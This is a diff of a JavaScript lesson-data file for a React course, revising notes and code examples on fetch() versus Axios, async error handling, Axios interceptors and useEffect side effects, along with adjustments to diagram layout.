+              Modern frontend web applications rely on remote Application Programming Interfaces (APIs) to fetch data from cloud databases and external services (e.g., weather updates, user profiles, product catalogs).
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>Role of the Frontend:</strong> Real-world frontend applications rarely store master data on the client. The backend server provides REST or GraphQL endpoints (JSON), and the frontend's job is to fetch, transform, and render that data.</li>
-              <li><strong>The Two Primary API Tools:</strong>
+              <li><strong>How Browsers Fetch Data:</strong>
                 <ul class="notes-sub-list">
-                  <li><strong><code>fetch()</code>:</strong> Native browser API built into JavaScript. Requires <strong>zero npm packages</strong>, but demands a 2-step async process (HTTP stream handshake + <code>response.json()</code> stream consumption).</li>
-                  <li><strong><code>axios</code>:</strong> Popular third-party HTTP client library (<code>npm i axios</code>). Streamlines requests into a <strong>single <code>await</code></strong>, automatically converts JSON responses into objects inside <code>response.data</code>, and offers clean interceptors.</li>
+                  <li><strong>Native <code>fetch()</code> API:</strong> Built directly into every modern web browser. Requires zero external npm packages, but requires manual handling for JSON parsing and error status codes.</li>
+                  <li><strong>Axios:</strong> The industry-standard third-party HTTP client (<code>npm install axios</code>) that provides automatic JSON parsing, request/response interceptors, and cleaner syntax.</li>
+                </ul>
+              </li>
+              <li><strong>The Non-Blocking Event Loop Mental Model:</strong>
+                <ul class="notes-sub-list">
+                  <li>JavaScript in the browser is <strong>single-threaded</strong>—it possesses only one primary Call Stack. If network requests blocked the call stack, your entire website would freeze completely (unclickable buttons, frozen animations) until the cloud server replied!</li>
+                  <li>To prevent UI freezing, network calls run asynchronously via <strong>Web APIs</strong> and resolve through the <strong>Microtask Queue</strong>, keeping the main UI thread buttery smooth at 60 frames per second.</li>
                 </ul>
               </li>
             </ul>
@@ -6579,8 +7052,8 @@ const loadedTasks = JSON.parse(localStorage.getItem('all-tasks')) || [];</code><
                   <!-- Browser Web API Engine -->
                   <g transform="translate(315, 20)">
                     <rect x="0" y="0" width="250" height="190" rx="10" fill="var(--bg-surface)" stroke="var(--warning)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="130" height="22" rx="4" fill="var(--warning-bg)" stroke="var(--warning)" stroke-width="1.2"/>
-                    <text x="80" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">BROWSER WEB APIS</text>
+                    <rect x="15" y="15" width="145" height="22" rx="4" fill="var(--warning-bg)" stroke="var(--warning)" stroke-width="1.2"/>
+                    <text x="87.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">BROWSER WEB APIS</text>
                     <text x="125" y="58" text-anchor="middle" class="svg-title" style="fill:var(--warning);">Network Thread</text>
 
                     <rect x="15" y="74" width="220" height="100" rx="6" fill="var(--bg-subsection)" stroke="var(--border)"/>
@@ -6597,8 +7070,8 @@ const loadedTasks = JSON.parse(localStorage.getItem('all-tasks')) || [];</code><
                   <!-- Microtask Queue & await resume -->
                   <g transform="translate(615, 20)">
                     <rect x="0" y="0" width="240" height="190" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="130" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
-                    <text x="80" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">MICROTASK QUEUE</text>
+                    <rect x="15" y="15" width="137" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
+                    <text x="83.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">MICROTASK QUEUE</text>
                     <text x="120" y="58" text-anchor="middle" class="svg-title" style="fill:var(--success);">await Resume</text>
 
                     <rect x="15" y="74" width="210" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
@@ -6614,32 +7087,27 @@ const loadedTasks = JSON.parse(localStorage.getItem('all-tasks')) || [];</code><
         },
         {
           num: "33.2",
-          title: "The Two-Stage await Stream in Native fetch()",
+          title: "Synchronous Execution vs. Asynchronous Promises",
           content: `
+            <p>
+              When an API request is initiated, the response is not instantaneous—it travels across fiber optic cables and cloud servers, taking anywhere from 50ms to 2000ms.
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>Why <code>fetch()</code> Needs <code>await</code> Twice:</strong>
+              <li><strong>The Pending Promise Trap:</strong>
+                <pre class="notes-code-block"><code>// ❌ JUNIOR MISTAKE: Treating async call as synchronous
+function loadData() {
+  const response = fetch('https://api.example.com/users');
+  console.log(response); // Prints: Promise { &lt;pending&gt; }, NOT the users!
+}</code></pre>
+              </li>
+              <li><strong>The Solution — <code>async / await</code>:</strong>
                 <ul class="notes-sub-list">
-                  <li><strong>Stage 01 (<code>const response = await fetch(url)</code>):</strong> Pauses until the HTTP headers and status code arrive from the remote server (e.g. <code>200 OK</code>). At this point, the response body is still an open, unread network byte stream.</li>
-                  <li><strong>Stage 02 (<code>const data = await response.json()</code>):</strong> Reading and parsing that incoming byte stream into a JavaScript JSON object is itself asynchronous. Thus, you must <code>await</code> the stream parser before using the resulting object!</li>
+                  <li>Mark the enclosing function as <code>async</code>.</li>
+                  <li>Use the <code>await</code> keyword to pause the local function execution until the promise settles, without blocking the browser UI thread!</li>
                 </ul>
               </li>
-              <li><strong>Async Function Requirement:</strong> You cannot use <code>await</code> at top-level within regular functions. The enclosing function must always be marked with the <strong><code>async</code></strong> keyword.</li>
             </ul>
-
-            <pre class="notes-code-block"><code>// The enclosing function must be marked async
-const getData = async () => {
-  try {
-    // 1. First await: Wait for initial HTTP response stream headers
-    const response = await fetch('https://jsonplaceholder.typicode.com/todos/1');
-
-    // 2. Second await: Wait for response body stream to parse into JSON
-    const data = await response.json();
-
-    console.log(data); // { userId: 1, id: 1, title: 'delectus aut autem', completed: false }
-  } catch (error) {
-    console.error('API Fetch failed:', error);
-  }
-};</code></pre>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -6651,8 +7119,8 @@ const getData = async () => {
                   <!-- Stage 1 -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="380" height="170" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">STAGE 1: AWAIT FETCH(URL)</text>
+                    <rect x="15" y="15" width="212" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="121" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">STAGE 1: AWAIT FETCH(URL)</text>
                     <text x="190" y="56" text-anchor="middle" class="svg-title">HTTP Stream Handshake</text>
 
                     <rect x="15" y="72" width="350" height="82" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -6669,8 +7137,8 @@ const getData = async () => {
                   <!-- Stage 2 -->
                   <g transform="translate(475, 20)">
                     <rect x="0" y="0" width="380" height="170" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
-                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">STAGE 2: AWAIT RES.JSON()</text>
+                    <rect x="15" y="15" width="212" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
+                    <text x="121" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">STAGE 2: AWAIT RES.JSON()</text>
                     <text x="190" y="56" text-anchor="middle" class="svg-title" style="fill:var(--success);">Stream Body Deserialization</text>
 
                     <rect x="15" y="72" width="350" height="82" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
@@ -6682,35 +7150,120 @@ const getData = async () => {
               </div>
             </figure>
           `
+        },
+        {
+          num: "33.3",
+          title: "The Two-Stage Handshake (res.json()) & Defensive Error Handling",
+          content: `
+            <p>
+              One of the most confusing aspects of native <code>fetch()</code> is why it requires <strong>two distinct <code>await</code> statements</strong> to receive data:
+            </p>
+
+            <ul class="notes-bullet-list">
+              <li><strong>Stage 1 — <code>const res = await fetch(url)</code>:</strong>
+                <ul class="notes-sub-list">
+                  <li>Resolves as soon as the cloud server responds with the <strong>HTTP Response Headers</strong> and status code (e.g. <code>200 OK</code>). The actual payload body has NOT fully downloaded yet!</li>
+                </ul>
+              </li>
+              <li><strong>Stage 2 — <code>const data = await res.json()</code>:</strong>
+                <ul class="notes-sub-list">
+                  <li>Reads the incoming byte stream from the network buffer and deserializes the raw text into a living JavaScript Object. Because reading a data stream is asynchronous, it requires its own <code>await</code>!</li>
+                </ul>
+              </li>
+              <li><strong>The Critical <code>res.ok</code> Gotcha:</strong>
+                <ul class="notes-sub-list">
+                  <li><strong>Important:</strong> <code>fetch()</code> will NOT reject or throw an error on HTTP error status codes like <code>404 Not Found</code> or <code>500 Internal Server Error</code>! It only rejects on total network failure.</li>
+                  <li>You must defensively inspect <code>if (!res.ok) throw new Error(...)</code> manually!</li>
+                </ul>
+              </li>
+            </ul>
+
+            <pre class="notes-code-block"><code>import React, { useState } from 'react';
+
+function UserDirectory() {
+  const [users, setUsers] = useState([]);
+  const [isLoading, setIsLoading] = useState(false);
+  const [errorMsg, setErrorMsg] = useState(null);
+
+  const fetchUsers = async () => {
+    setIsLoading(true);
+    setErrorMsg(null);
+
+    try {
+      // Stage 1: Wait for HTTP headers
+      const res = await fetch('https://jsonplaceholder.typicode.com/users');
+      
+      // Critical defensive status check
+      if (!res.ok) {
+        throw new Error('HTTP Error: ' + res.status + ' (' + res.statusText + ')');
+      }
+
+      // Stage 2: Wait for stream body parsing
+      const data = await res.json();
+      setUsers(data);
+    } catch (err) {
+      console.error('Fetch failed:', err.message);
+      setErrorMsg(err.message);
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
+  return (
+    &lt;div className="p-6 max-w-md mx-auto"&gt;
+      &lt;button 
+        onClick={fetchUsers}
+        disabled={isLoading}
+        className="px-4 py-2 bg-emerald-600 text-white rounded font-medium disabled:opacity-50"
+      &gt;
+        {isLoading ? 'Loading Users...' : 'Fetch User List'}
+      &lt;/button&gt;
+
+      {errorMsg && (
+        &lt;p className="mt-3 text-sm text-red-600 font-semibold"&gt;Error: {errorMsg}&lt;/p&gt;
+      )}
+
+      &lt;ul className="mt-4 space-y-2"&gt;
+        {users.map(u => (
+          &lt;li key={u.id} className="p-2.5 border rounded bg-card text-sm"&gt;
+            &lt;span className="font-bold"&gt;{u.name}&lt;/span&gt; · {u.email}
+          &lt;/li&gt;
+        ))}
+      &lt;/ul&gt;
+    &lt;/div&gt;
+  );
+}
+
+export default UserDirectory;</code></pre>
+          `
         }
       ]
     },
 
     /* ═══════════════════════════════════════════════════════════════
-       TOPIC 34: CALLING APIS WITH AXIOS (CLEANER & SHORTER METHOD)
+       TOPIC 34
        ═══════════════════════════════════════════════════════════════ */
     {
       id: "react-34-calling-apis-with-axios",
       number: "34",
       shortLabel: "APIs With Axios",
       title: "Calling APIs With Axios (Cleaner & Shorter Method)",
-      summary: "Installing and leveraging Axios for automatic JSON deserialization, saving HTTP responses into useState arrays, and rendering dynamic API data cards with key props.",
-      subtopicLabels: ["34.1 Why Axios Beats fetch", "34.2 Axios State Pipeline", "34.3 Dynamic Rendering & useEffect Teaser"],
+      summary: "Why production teams prefer Axios over native fetch: automatic JSON body parsing, automatic 4xx/5xx HTTP error rejection, request and response interceptors, and request cancellation.",
+      subtopicLabels: ["34.1 Why Axios Over Native fetch()", "34.2 Core Axios Syntax & Automatic Error Rejection", "34.3 Production Interceptors & Token Injection"],
       diagramCount: 2,
       sections: [
         {
           num: "34.1",
-          title: "Installing Axios & Why It Beats Native fetch()",
+          title: "Why Axios Over Native fetch()? (Feature Comparison)",
           content: `
+            <p>
+              While native <code>fetch()</code> is capable, real-world engineering teams universally favor <strong>Axios</strong> for building scalable web apps due to several decisive advantages:
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>Installation &amp; Setup:</strong> Install in your project terminal: <code>npm i axios</code>, then import at the top of your component: <code>import axios from 'axios';</code>.</li>
-              <li><strong>Why Developers Prefer Axios Over Native <code>fetch()</code>:</strong>
-                <ul class="notes-sub-list">
-                  <li><strong>Single <code>await</code> Step:</strong> You only write <code>const response = await axios.get(url)</code>. No second <code>response.json()</code> await is required!</li>
-                  <li><strong>Automatic JSON Transformation:</strong> Axios inspects the response headers and automatically deserializes JSON into a clean JavaScript object or array directly on <strong><code>response.data</code></strong>.</li>
-                  <li><strong>Automatic Error Rejection:</strong> Unlike <code>fetch()</code> (which considers HTTP <code>404</code> or <code>500</code> as successful promises), Axios automatically throws an error for any status code outside the 2xx range, jumping straight into your <code>catch</code> block.</li>
-                </ul>
-              </li>
+              <li><strong>1. Automatic JSON Transformation:</strong> With native <code>fetch()</code>, you must remember to call <code>await res.json()</code> on every single request. Axios handles stream transformation automatically—your parsed JavaScript data is immediately accessible at <code>response.data</code> in one single <code>await</code>!</li>
+              <li><strong>2. Automatic HTTP Error Rejection:</strong> Native <code>fetch()</code> will happily enter your success path on a <code>404 Not Found</code> or <code>500 Server Crash</code>. Axios automatically throws an error on any response status code outside the <code>2xx</code> range, allowing your standard <code>try...catch</code> block to catch all errors seamlessly.</li>
+              <li><strong>3. Interceptors:</strong> Axios lets you define global middleware interceptors to automatically inject authorization headers (e.g. <code>Bearer &lt;token&gt;</code>) into every outgoing request and refresh expired tokens on <code>401 Unauthorized</code>.</li>
             </ul>
 
             <figure class="diagram-frame">
@@ -6737,8 +7290,8 @@ const getData = async () => {
                   <!-- Axios -->
                   <g transform="translate(455, 20)">
                     <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="120" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
-                    <text x="75" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">AXIOS LIBRARY</text>
+                    <rect x="15" y="15" width="123" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
+                    <text x="76.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">AXIOS LIBRARY</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--success);">1-Step Auto-Deserialization</text>
 
                     <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
@@ -6754,57 +7307,106 @@ const getData = async () => {
         },
         {
           num: "34.2",
-          title: "Fetching & Storing API Data With Axios + useState",
+          title: "Core Axios Syntax & Clean Error Handling",
           content: `
-            <ul class="notes-bullet-list">
-              <li><strong>The 3-Step API-to-UI Pattern:</strong>
-                <ul class="notes-sub-list">
-                  <li><strong>Step 1 (State Initialization):</strong> Create an empty array state: <code>const [data, setData] = useState([]);</code> to hold incoming objects.</li>
-                  <li><strong>Step 2 (Data Fetch &amp; State Dispatch):</strong> When triggered, <code>axios.get('https://picsum.photos/v2/list')</code> receives the array of 30 image objects and updates state: <code>setData(response.data)</code>.</li>
-                  <li><strong>Step 3 (Re-render &amp; Array Mapping):</strong> React re-renders the component and runs <code>data.map((item, idx) =&gt; ...)</code>, projecting each object dynamically onto UI elements.</li>
-                </ul>
-              </li>
-              <li><strong>Upcoming Chapter Teaser (<code>useEffect</code>):</strong> In this practice example, the API only triggers when the user clicks a button. In production, we usually want data to load <strong>automatically on initial page mount</strong>—which brings us to the fundamental <strong><code>useEffect</code> Hook</strong>!</li>
-            </ul>
+            <p>
+              Installation is straightforward: <code>npm install axios</code>. Once installed, making GET, POST, PUT, and DELETE requests requires just one concise line:
+            </p>
 
-            <pre class="notes-code-block"><code>import React, { useState } from 'react'
-import axios from 'axios'
+            <pre class="notes-code-block"><code>import React, { useState } from 'react';
+import axios from 'axios';
 
-const App = () => {
-  // 1. Initialize empty state array to hold fetched API records
-  const [data, setData] = useState([])
+function ProductCatalog() {
+  const [products, setProducts] = useState([]);
+  const [loading, setLoading] = useState(false);
 
-  const getData = async () => {
+  const fetchProducts = async () => {
+    setLoading(true);
     try {
-      // 2. Fetch data with Axios (Lorem Picsum public API)
-      const response = await axios.get('https://picsum.photos/v2/list')
-
-      // 3. Save directly into state (response.data is already an array of 30 items)
-      setData(response.data)
-      console.log('Fetched', response.data.length, 'records')
+      // Single await: response.data is already deserialized JSON!
+      const response = await axios.get('https://fakestoreapi.com/products?limit=5');
+      setProducts(response.data);
     } catch (err) {
-      console.error('API call failed:', err)
+      // Axios error objects provide rich diagnostic details
+      if (err.response) {
+        // Server responded with non-2xx status (e.g. 404, 500)
+        console.error('Server responded with status:', err.response.status);
+      } else if (err.request) {
+        // Request made but no response received (network offline)
+        console.error('Network unreachable, check connection.');
+      } else {
+        console.error('Error setup:', err.message);
+      }
+    } finally {
+      setLoading(false);
     }
-  }
+  };
 
   return (
-    &lt;div style={{ padding: '2rem' }}&gt;
-      &lt;button onClick={getData}&gt;Get Data&lt;/button&gt;
+    &lt;div className="p-6"&gt;
+      &lt;button onClick={fetchProducts} className="px-4 py-2 bg-emerald-600 text-white rounded font-bold"&gt;
+        {loading ? 'Fetching...' : 'Load Products via Axios'}
+      &lt;/button&gt;
 
-      {/* 4. Render array items dynamically on screen */}
-      &lt;div style={{ marginTop: '1.5rem', display: 'flex', flexWrap: 'wrap', gap: '1rem' }}&gt;
-        {data.map((elem, idx) =&gt; (
-          &lt;div key={idx} style={{ border: '1px solid #ccc', padding: '1rem', borderRadius: '8px' }}&gt;
-            &lt;h4&gt;Author: {elem.author}&lt;/h4&gt;
-            &lt;img src={elem.download_url} alt={elem.author} width="160" height="100" style={{ objectFit: 'cover' }} /&gt;
+      &lt;div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-6"&gt;
+        {products.map(p => (
+          &lt;div key={p.id} className="p-4 border rounded-lg bg-card shadow-sm"&gt;
+            &lt;h4 className="font-bold text-sm"&gt;{p.title}&lt;/h4&gt;
+            &lt;p className="text-emerald-600 font-mono font-semibold mt-1"&gt;\${p.price}&lt;/p&gt;
           &lt;/div&gt;
         ))}
       &lt;/div&gt;
     &lt;/div&gt;
-  )
+  );
 }
 
-export default App</code></pre>
+export default ProductCatalog;</code></pre>
+          `
+        },
+        {
+          num: "34.3",
+          title: "Production Interceptors & Centralized API Instances",
+          content: `
+            <p>
+              In production applications, you never call <code>axios.get('https://api.mycompany.com/...')</code> directly in your components. Instead, you create a configured Axios instance with base URLs, timeouts, and request interceptors:
+            </p>
+
+            <pre class="notes-code-block"><code>// api/axiosClient.js
+import axios from 'axios';
+
+const apiClient = axios.create({
+  baseURL: 'https://api.mycompany.com/v1',
+  timeout: 10000, // 10 second timeout
+  headers: {
+    'Content-Type': 'application/json'
+  }
+});
+
+// Request Interceptor: Automatically inject Auth Token
+apiClient.interceptors.request.use(
+  (config) => {
+    const token = sessionStorage.getItem('auth_token');
+    if (token) {
+      config.headers.Authorization = 'Bearer ' + token;
+    }
+    return config;
+  },
+  (error) => Promise.reject(error)
+);
+
+// Response Interceptor: Handle Global 401 Unauthorized
+apiClient.interceptors.response.use(
+  (response) => response,
+  (error) => {
+    if (error.response && error.response.status === 401) {
+      console.warn('Session expired. Redirecting to login...');
+      window.location.href = '/login';
+    }
+    return Promise.reject(error);
+  }
+);
+
+export default apiClient;</code></pre>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -6816,8 +7418,8 @@ export default App</code></pre>
                   <!-- Step 1: User Click -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="70" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="50" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">STEP 01</text>
+                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">STEP 01</text>
                     <text x="90" y="56" text-anchor="middle" class="svg-title">Trigger Action</text>
 
                     <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -6834,8 +7436,8 @@ export default App</code></pre>
                   <!-- Step 2: State Dispatch -->
                   <g transform="translate(245, 20)">
                     <rect x="0" y="0" width="200" height="180" rx="10" fill="var(--bg-surface)" stroke="var(--primary)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="70" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="50" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">STEP 02</text>
+                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">STEP 02</text>
                     <text x="100" y="56" text-anchor="middle" class="svg-title">State Mutation</text>
 
                     <rect x="15" y="70" width="170" height="92" rx="6" fill="var(--bg-subsection)" stroke="var(--border)"/>
@@ -6852,8 +7454,8 @@ export default App</code></pre>
                   <!-- Step 3: Array Mapping -->
                   <g transform="translate(485, 20)">
                     <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="70" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="50" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">STEP 03</text>
+                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">STEP 03</text>
                     <text x="90" y="56" text-anchor="middle" class="svg-title">JSX Projection</text>
 
                     <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -6870,8 +7472,8 @@ export default App</code></pre>
                   <!-- Step 4: Live DOM Render -->
                   <g transform="translate(705, 20)">
                     <rect x="0" y="0" width="150" height="180" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="70" height="20" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
-                    <text x="50" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">STEP 04</text>
+                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
+                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">STEP 04</text>
                     <text x="75" y="56" text-anchor="middle" class="svg-title" style="fill:var(--success);">DOM Render</text>
 
                     <rect x="15" y="70" width="120" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
@@ -6886,44 +7488,48 @@ export default App</code></pre>
           `
         }
       ]
-    }
-,
+    },
+
+    /* ═══════════════════════════════════════════════════════════════
+       TOPIC 35
+       ═══════════════════════════════════════════════════════════════ */
     {
-      id: 'react-35',
-      number: 35,
-      shortLabel: 'React 35',
-      title: 'Understanding useEffect (The Road & Truck Analogy)',
-      summary: 'Demystifying side effects in React: Why API calls, DOM manipulation, and timers must not execute directly within the component body, and how useEffect offloads non-rendering operations into an asynchronous side stack.',
-      subtopicLabels: [
-        '35.1 Side Effects & Execution Cost',
-        '35.2 The Road & Truck Analogy'
-      ],
+      id: "react-35-understanding-useeffect-road-truck",
+      number: "35",
+      shortLabel: "Understanding useEffect",
+      title: "Understanding useEffect (The Road & Truck Analogy)",
+      summary: "Pure rendering vs. side effects, the render phase vs. commit phase, the intuitive Road & Truck mental model, and keeping side effects from blocking the primary UI thread.",
+      subtopicLabels: ["35.1 What Are Side Effects & Pure Rendering", "35.2 The Road & Truck Mental Model", "35.3 The Infinite Loop Trap of Unshielded Effects"],
       diagramCount: 2,
       sections: [
         {
-          id: 'react-35-1',
-          num: '35.1',
-          title: 'What Are Side Effects & Why Running Them Directly Fails',
+          num: "35.1",
+          title: "What Are Side Effects & Why React Demands Pure Rendering",
           content: `
             <p>
-              In React, a component's primary responsibility is <strong>pure rendering</strong>: accepting props and state, computing the corresponding JSX structure, and returning a Virtual DOM tree for the browser to display.
+              To understand the <code>useEffect</code> hook, one must first master the fundamental principle of React: <strong>Components must be pure functions during the Render Phase</strong>.
             </p>
-            <p>
-              A <strong>Side Effect</strong> is any operation that reaches outside the pure render cycle to interact with the external environment or mutate external systems. Standard examples include:
-            </p>
-            <ul>
-              <li><strong>Network Requests:</strong> Fetching data from a REST endpoint or GraphQL service via <code>axios</code> or <code>fetch()</code>.</li>
-              <li><strong>Direct DOM Mutations:</strong> Setting <code>document.title</code>, manually scrolling the viewport, or interfacing with external canvas libraries.</li>
-              <li><strong>Asynchronous Timers:</strong> Setting intervals or timeouts via <code>setInterval</code> or <code>setTimeout</code>.</li>
-              <li><strong>Event Subscriptions:</strong> Attaching global listeners to <code>window.addEventListener('resize', ...)</code> or WebSockets.</li>
-            </ul>
 
-            <div class="callout-card callout-warning">
-              <div class="callout-title">The Danger of Direct Execution Inside the Component Body</div>
-              <p>
-                If an asynchronous operation (such as an API call or timer) is executed directly in the body of a functional component, it triggers on <strong>every single render</strong>. If that operation updates state, it causes an immediate re-render, creating an <strong>infinite execution loop</strong> that crashes the browser tab and overwhelms backend APIs.
-              </p>
-            </div>
+            <ul class="notes-bullet-list">
+              <li><strong>React's Primary Job (Pure Rendering):</strong>
+                <ul class="notes-sub-list">
+                  <li>Given a specific set of <code>props</code> and <code>state</code>, a React component should calculate and return JSX markup.</li>
+                  <li>Pure rendering means: calling the component twice with the identical props and state should return the exact same JSX, without causing external ripples or modifying anything outside the component.</li>
+                </ul>
+              </li>
+              <li><strong>What is a "Side Effect" (Effect)?</strong>
+                <ul class="notes-sub-list">
+                  <li>A <strong>side effect</strong> is any operation that reaches outside the component function to interact with the external world.</li>
+                  <li><strong>Common Examples:</strong>
+                    <br>&bull; Fetching data from a cloud REST API
+                    <br>&bull; Manually mutating the physical browser DOM (e.g. <code>document.title = ...</code>)
+                    <br>&bull; Setting timers (<code>setTimeout</code>, <code>setInterval</code>)
+                    <br>&bull; Subscribing to browser WebSockets or geolocation sensors
+                    <br>&bull; Writing data to browser <code>localStorage</code>
+                  </li>
+                </ul>
+              </li>
+            </ul>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -6935,8 +7541,8 @@ export default App</code></pre>
                   <!-- Main UI Thread -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="150" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="90" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">PRIMARY RENDER THREAD</text>
+                    <rect x="15" y="15" width="182" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="106" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">PRIMARY RENDER THREAD</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title">Pure UI Pipeline (60 FPS Goal)</text>
 
                     <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -6949,8 +7555,8 @@ export default App</code></pre>
                   <!-- Side-Effect Stack -->
                   <g transform="translate(455, 20)">
                     <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="140" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="85" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">EFFECT TASK QUEUE</text>
+                    <rect x="15" y="15" width="152" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="91" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">EFFECT TASK QUEUE</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title">Asynchronous Side Stack</text>
 
                     <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -6968,24 +7574,32 @@ export default App</code></pre>
           `
         },
         {
-          id: 'react-35-2',
-          num: '35.2',
-          title: 'The Road & Truck Analogy: Main UI Highway vs. Decoupled Side Stack',
+          num: "35.2",
+          title: "The Road & Truck Analogy (Main Render Thread vs. Side Stack)",
           content: `
             <p>
-              To visualize why React introduces <code>useEffect</code>, consider the <strong>Road and Truck Analogy</strong>:
+              Imagine a highway with a <strong>big blue delivery truck</strong> driving down it:
             </p>
-            <ul>
-              <li><strong>The Highway:</strong> Represents the browser’s render process. It must remain fluid, unobstructed, and fast to maintain a responsive 60 frames per second.</li>
-              <li><strong>The Delivery Truck:</strong> Represents React’s main rendering engine. Its sole purpose is delivering and displaying UI pixels on screen without delay.</li>
